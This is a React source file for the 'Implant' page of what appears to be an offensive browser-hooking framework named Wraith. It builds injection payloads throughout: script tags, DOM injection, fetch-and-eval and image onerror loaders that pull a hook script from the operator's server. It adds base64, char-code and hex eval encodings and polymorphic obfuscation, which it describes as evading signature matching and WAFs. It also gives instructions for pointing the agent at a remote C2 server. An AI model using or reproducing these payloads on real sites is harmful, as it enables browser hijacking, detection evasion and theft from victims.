import { useState } from 'react'
import { Check, Copy } from 'lucide-react'

function CodeBlock({ label, code }: { label: string; code: string }) {
  const [copied, setCopied] = useState(false)

  const handleCopy = () => {
    navigator.clipboard.writeText(code).then(() => {
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    })
  }

  return (
    <div className="border border-border rounded-lg overflow-hidden">
      <div className="flex items-center justify-between px-4 py-2 bg-panel border-b border-border">
        <span className="text-xs text-muted">{label}</span>
        <button
          onClick={handleCopy}
          className="flex items-center gap-1.5 text-xs text-muted hover:text-gray-300 transition-colors"
        >
          {copied ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre className="px-4 py-3 text-sm font-mono text-gray-300 overflow-x-auto bg-surface">
        <code>{code}</code>
      </pre>
    </div>
  )
}

// ── Encoding helpers ──────────────────────────────────────────────────────────

function toBase64(js: string): string {
  return `eval(atob('${btoa(js)}'))`
}

function toCharCodes(js: string): string {
  const codes = Array.from(js).map(c => c.charCodeAt(0)).join(',')
  return `eval(String.fromCharCode(${codes}))`
}

function toHexStrEval(js: string): string {
  const hex = Array.from(js).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
  return `eval("${hex}")`
}

type Encoding = 'none' | 'base64' | 'charcode' | 'hex'

const ENCODINGS: { value: Encoding; label: string; description: string }[] = [
  { value: 'none',     label: 'None',               description: 'Plain text — no obfuscation' },
  { value: 'base64',   label: 'Base64',              description: 'eval(atob(\'...\')) — evades basic string matching' },
  { value: 'charcode',  label: 'String.fromCharCode', description: 'eval(String.fromCharCode(...)) — no readable strings' },
  { value: 'hex',      label: 'Hex escape',          description: 'eval("\\x76\\x61...") — hex-encoded string' },
]

function encode(js: string, encoding: Encoding): string {
  switch (encoding) {
    case 'base64':   return toBase64(js)
    case 'charcode': return toCharCodes(js)
    case 'hex':      return toHexStrEval(js)
    default:         return js
  }
}

// ── Component ─────────────────────────────────────────────────────────────────

export function Implant() {
  const httpOrigin = window.location.protocol + '//' + window.location.hostname + ':3000'
  const [obfuscate, setObfuscate] = useState(false)
  const hookUrl = httpOrigin + (obfuscate ? '/hook.obf.js' : '/hook.js')
  const [encoding, setEncoding] = useState<Encoding>('none')

  const encoded = encoding !== 'none'

  // Raw JS payloads (used as input to encoders)
  const domInjectJs = `var s=document.createElement('script');s.src='${hookUrl}';document.head.appendChild(s);`
  const fetchEvalJs = `fetch('${hookUrl}').then(r=>r.text()).then(eval);`

  // Payloads to display
  const scriptTag    = encoded
    ? `<script>${encode(domInjectJs, encoding)}</script>`
    : `<script src="${hookUrl}"></script>`
  const domInject    = encode(domInjectJs, encoding)
  const fetchEval    = encode(fetchEvalJs, encoding)
  const imgOnerror   = encoded
    ? `<img src=x onerror="${encode(domInjectJs, encoding)}">`
    : `<img src=x onerror="${domInjectJs}">`

  return (
    <div className="flex-1 overflow-y-auto p-6">
      <div className="max-w-2xl mx-auto flex flex-col gap-6">
        <div className="rounded-lg border border-yellow-700/50 bg-yellow-950/20 px-4 py-3">
          <p className="text-xs text-yellow-400 font-semibold uppercase tracking-wider">Authorized use only</p>
          <p className="text-xs text-yellow-200/70 mt-1">
            Only inject into pages you own or have explicit written permission to test.
            Unauthorized use is illegal under the CFAA and equivalent laws worldwide.
          </p>
        </div>

        <div className="flex items-start justify-between gap-4">
          <div>
            <h1 className="text-sm font-semibold text-accent uppercase tracking-widest">Implant Payload</h1>
            <p className="text-xs text-muted mt-1">
              Inject one of the following into the target page to establish a hook.
            </p>
          </div>
        </div>

        {/* Obfuscation + Encoding */}
        <div className="border border-border rounded-lg p-4 bg-panel space-y-4">
          {/* Obfuscation toggle */}
          <div>
            <label className="flex items-center gap-3 cursor-pointer group">
              <div
                className={`relative w-8 h-[18px] rounded-full transition-colors ${
                  obfuscate ? 'bg-accent' : 'bg-border'
                }`}
                onClick={() => setObfuscate(o => !o)}
              >
                <div
                  className={`absolute top-[2px] w-[14px] h-[14px] rounded-full bg-white transition-transform ${
                    obfuscate ? 'translate-x-[16px]' : 'translate-x-[2px]'
                  }`}
                />
              </div>
              <div>
                <span className="text-xs font-semibold text-gray-300 uppercase tracking-wider">Obfuscation</span>
                <p className="text-[10px] text-muted mt-0.5">
                  {obfuscate
                    ? <>Serving from <span className="font-mono text-gray-400">/hook.obf.js</span> — polymorphic output, fresh obfuscation per request</>
                    : <>Off — serving plain <span className="font-mono text-gray-400">/hook.js</span></>
                  }
                </p>
              </div>
            </label>
            {obfuscate && (
              <div className="mt-2 ml-11 text-[10px] text-muted space-y-0.5">
                <p>Control flow flattening, dead code injection, string array encoding,</p>
                <p>identifier renaming, string splitting — different output each request.</p>
              </div>
            )}
          </div>

          {/* Divider */}
          <div className="border-t border-border" />

          {/* Encoding selector */}
          <div>
            <p className="text-xs font-semibold text-gray-300 uppercase tracking-wider mb-3">Loader Encoding</p>
            <div className="grid grid-cols-2 gap-2">
              {ENCODINGS.map(enc => (
                <button
                  key={enc.value}
                  onClick={() => setEncoding(enc.value)}
                  className={`text-left px-3 py-2 rounded border transition-colors ${
                    encoding === enc.value
                      ? 'border-accent bg-accent/10 text-accent'
                      : 'border-border text-gray-400 hover:text-gray-200 hover:border-gray-500'
                  }`}
                >
                  <span className="text-xs font-medium block">{enc.label}</span>
                  <span className="text-[10px] text-muted block mt-0.5">{enc.description}</span>
                </button>
              ))}
            </div>
          </div>
        </div>

        <CodeBlock
          label={encoded ? 'Script tag — inline encoded loader' : 'Script tag — drop into HTML'}
          code={scriptTag}
        />

        <CodeBlock
          label={encoded ? 'DOM injection — encoded' : 'DOM injection — run from browser console or XSS'}
          code={domInject}
        />

        <CodeBlock
          label={encoded ? 'Fetch + eval — encoded' : 'Fetch + eval — no script element in DOM'}
          code={fetchEval}
        />

        <CodeBlock
          label={encoded ? 'Image onerror — encoded' : 'Image tag onerror trick — bypass basic CSP script-src'}
          code={imgOnerror}
        />

        <div className="border border-border rounded-lg p-4 bg-panel">
          <h2 className="text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">Notes</h2>
          <ul className="text-xs text-muted space-y-1.5 list-disc list-inside">
            <li>
              The hook URL is <span className="font-mono text-gray-300">{hookUrl}</span> — served by the Wraith HTTP server on port 3000.
            </li>
            <li>
              For remote targets, replace <span className="font-mono text-gray-300">localhost</span> with your server's public IP or domain.
            </li>
            <li>
              The agent connects back to <span className="font-mono text-gray-300">ws://localhost:3001</span> by default.
              For remote targets, rebuild with your server's address baked in: <span className="font-mono text-gray-300">C2_URL=wss://your-vps.com:3001 pnpm build:agent</span>
            </li>
            <li>
              The agent has a singleton guard — injecting twice on the same page is safe; the second load is a no-op.
            </li>
            <li>
              Bundle size is ~4 KB minified.
            </li>
            {encoded && (
              <li>
                Loader encoding obscures the dropper string but does not bypass CSP or runtime analysis.
                It evades basic WAF signature matching and casual inspection.
              </li>
            )}
            {obfuscate && (
              <li>
                Obfuscation transforms the hook.js payload itself — control flow flattening, dead code injection,
                string array encoding. Each request to <span className="font-mono text-gray-300">/hook.obf.js</span> produces
                unique output (polymorphic). Increases bundle size ~3-5x.
              </li>
            )}
          </ul>
        </div>
      </div>
    </div>
  )
}
